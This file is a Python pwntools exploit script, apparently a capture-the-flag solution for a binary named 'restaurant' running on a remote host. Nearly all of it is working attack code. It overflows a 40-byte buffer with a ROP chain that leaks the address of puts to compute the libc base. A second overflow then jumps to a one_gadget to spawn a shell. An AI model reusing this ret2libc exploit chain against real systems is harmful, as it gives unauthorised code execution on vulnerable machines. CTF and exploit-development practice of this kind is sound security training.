from pwn import *
import time
context.arch = "amd64"
#context.log_level = 'debug'
elf = ELF("./restaurant")
p = process("./restaurant") 
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so") # local exploit
#rop = ROP("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#gdb.attach(p,'''b * 0x00000000004010a3
#c''')

p = remote("206.189.125.80", 30246)
libc = ELF("./libc.so.6") # remote exploit# Leaking libc base => puts() + main() + puts@got ---
print("\n--- Leaking puts:")
puts_got = elf.got["puts"] # got entry for puts()
puts_plt = elf.plt["puts"] # puts() from binary
pop_rdi_ret = 0x00000000004010a3 # pop rdi; ret 
main_addr = elf.symbols["main"]
log.success("puts@got address: 0x%x" %(puts_got))
p.sendline("1")
p.recv()
# 1st ROP - [set rdi => arg1 for puts] [arg1 = puts@got] [call puts] [ret to main]
p.sendline("A"*40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr))
time.sleep(1)
leak = p.recv()
l = leak.find("\xa3\x10\x40") + 3 
puts_libc = u64(leak[l:l+6].ljust(8,"\x00"))
log.success("Puts addr from libc: " + hex(puts_libc))
print("\n --- Calculating libc base:")
base_libc = puts_libc - 0x0000000000080aa0
log.success("Base libc addr: " + hex(base_libc))
# ---# Calculating one_gadget and overflowing again to its address ---
one_gadget = base_libc + 0x4f432
ret = 0x40063e
p.sendline("1")
p.recv()
p.sendline("A"*40 + p64(one_gadget) + p64(ret))
time.sleep(1)
p.recv()
# ---p.interactive()
